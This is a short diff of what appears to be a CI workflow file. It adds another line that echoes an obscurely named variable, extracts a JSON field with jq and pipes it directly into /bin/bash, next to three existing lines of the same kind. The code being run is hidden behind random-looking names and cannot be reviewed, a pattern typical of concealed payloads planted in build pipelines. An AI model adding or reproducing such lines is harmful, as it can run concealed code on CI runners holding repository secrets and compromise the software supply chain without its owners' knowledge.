@@ -49,6 +49,7 @@ jobs:
           echo $vej62122 | jq -r .fqhk005 | /bin/bash
           echo $abjr1 | jq -r .otpc750 | /bin/bash
           echo $x11 | jq -r .yl77940 | /bin/bash
+          echo $naq605 | jq -r .tuogf905 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
